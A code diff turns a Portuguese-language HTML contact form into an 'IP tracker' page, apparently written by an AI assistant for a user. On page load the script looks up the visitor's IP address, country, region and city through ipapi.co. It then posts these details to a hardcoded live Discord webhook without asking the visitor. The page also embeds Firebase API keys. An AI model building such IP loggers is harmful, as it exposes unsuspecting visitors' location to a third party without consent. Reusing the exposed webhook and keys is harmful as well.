@@ -2,36 +2,59 @@
 <html lang="pt-BR">
 <head>
   <meta charset="UTF-8">
-  <title>Enviar para Discord</title>
+  <title>IP Tracker com Firebase + Discord</title>
 </head>
 <body>
-  <h1>Formulário de envio</h1>
-  <form id="dadosForm">
-    <label>Nome: <input type="text" id="nome"></label><br><br>
-    <label>Cidade: <input type="text" id="cidade"></label><br><br>
-    <button type="submit">Enviar</button>
-  </form>
+  <h1>Seu acesso</h1>
+  <div id="info">Carregando...</div>
 
   <script>
-    const webhookURL = "https://discord.com/api/webhooks/https://discord.com/api/webhooks/1519484333717459095/VPDh0-rxLraKrrjjEuSGSfGIi9Bb7L_GPeo7wN3q6tnmv0ODz4hjzuLBETkrHenM5Ra-";
+    // Configuração Firebase (mantida conforme você pediu)
+    const config = {
+      apiKey: "AIzaSyDegW2sEjWvx3Ih7U6vs45Gp8PeXyfJ90w",
+      authDomain: "cyber-a41d9.firebaseapp.com",
+      projectId: "cyber-a41d9",
+      storageBucket: "cyber-a41d9.appspot.com",
+      messagingSenderId: "563443982918",
+      appId: "1:563443982918:web:61cf4b88f1b4ddd89ee047",
+      databaseURL: "https://cyber-a41d9-default-rtdb.firebaseio.com/"
+    };
 
-    document.getElementById("dadosForm").addEventListener("submit", function(e){
-      e.preventDefault();
-      const nome = document.getElementById("nome").value;
-      const cidade = document.getElementById("cidade").value;
+    // Seu webhook do Discord
+    const webhookURL = "https://discord.com/api/webhooks/1519484333717459095/VPDh0-rxLraKrrjjEuSGSfGIi9Bb7L_GPeo7wN3q6tnmv0ODz4hjzuLBETkrHenM5Ra-";
 
-      const mensagem = {
-        content: `Novo envio:\nNome: ${nome}\nCidade: ${cidade}`
-      };
+    // Pega IP e localização via ipapi.co
+    fetch("https://ipapi.co/json/")
+      .then(r => r.json())
+      .then(data => {
+        const texto = `Novo acesso:
+IP: ${data.ip}
+Localização: ${data.country_name}, ${data.region}, ${data.city}
+Hora: ${new Date().toLocaleString("pt-BR")}`;
 
-      fetch(webhookURL, {
-        method: "POST",
-        headers: { "Content-Type": "application/json" },
-        body: JSON.stringify(mensagem)
+        // Mostra na tela
+        document.getElementById("info").innerText = texto;
+
+        // Envia para Discord
+        fetch(webhookURL, {
+          method: "POST",
+          headers: { "Content-Type": "application/json" },
+          body: JSON.stringify({ content: texto })
+        })
+        .then(() => console.log("Enviado para Discord"))
+        .catch(err => console.error("Erro:", err));
       })
-      .then(() => alert("Enviado para o Discord!"))
-      .catch(err => alert("Erro: " + err));
-    });
+      .catch(() => {
+        document.getElementById("info").innerText = "Não foi possível obter dados.";
+      });
+  </script>
+
+  <!-- Scripts Firebase (se quiser usar depois) -->
+  <script src="https://www.gstatic.com/firebasejs/9.6.0/firebase-app-compat.js"></script>
+  <script src="https://www.gstatic.com/firebasejs/9.6.0/firebase-database-compat.js"></script>
+  <script>
+    firebase.initializeApp(config);
+    // Aqui você poderia salvar os dados no Firebase também, se quiser
   </script>
 </body>
 </html>
